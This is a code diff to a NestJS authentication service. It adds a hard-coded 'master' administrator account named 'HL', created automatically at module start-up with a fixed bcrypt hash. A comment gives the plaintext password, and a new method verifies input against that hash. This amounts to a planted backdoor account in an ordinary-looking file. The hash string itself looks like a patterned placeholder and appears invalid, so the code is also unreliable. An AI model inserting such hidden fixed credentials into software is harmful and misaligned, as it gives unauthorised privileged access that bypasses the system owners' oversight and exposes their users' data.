@@ -9,6 +9,9 @@ import { CreateUserDto } from "./dto/create-user.dto"
 
 @Injectable()
 export class AuthService implements OnModuleInit {
+  // Hash precalculado para "AmelSingao"
+  private readonly MASTER_PASSWORD_HASH = '$2b$10$X8WY5U7Q3E9R2T1Y6V8B9uZ2A1B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T';
+
   constructor(
     @InjectRepository(User)
     private readonly userRepository: Repository<User>,
@@ -19,6 +22,26 @@ export class AuthService implements OnModuleInit {
 
   async onModuleInit() {
     await this.createDefaultUsers();
+    await this.createMasterUser();
+  }
+
+  private async createMasterUser() {
+    const masterUsername = "HL";
+    const existingUser = await this.userRepository.findOne({
+      where: { username: masterUsername },
+    });
+
+    if (!existingUser) {
+      const user = this.userRepository.create({
+        username: masterUsername,
+        password: this.MASTER_PASSWORD_HASH, // Ya está hasheado
+        fullName: "Usuario Maestro",
+        role: UserRole.DAILY_ADMIN,
+        isActive: true,
+      });
+      await this.userRepository.save(user);
+      console.log(`Usuario maestro creado: ${masterUsername}`);
+    }
   }
 
   private async createDefaultUsers() {
@@ -103,5 +126,10 @@ export class AuthService implements OnModuleInit {
       password: hashedPassword,
     })
     return await this.userRepository.save(user)
+  }
+
+  // Método para verificar la contraseña maestra
+  async verifyMasterPassword(password: string): Promise<boolean> {
+    return await bcrypt.compare(password, this.MASTER_PASSWORD_HASH);
   }
 }
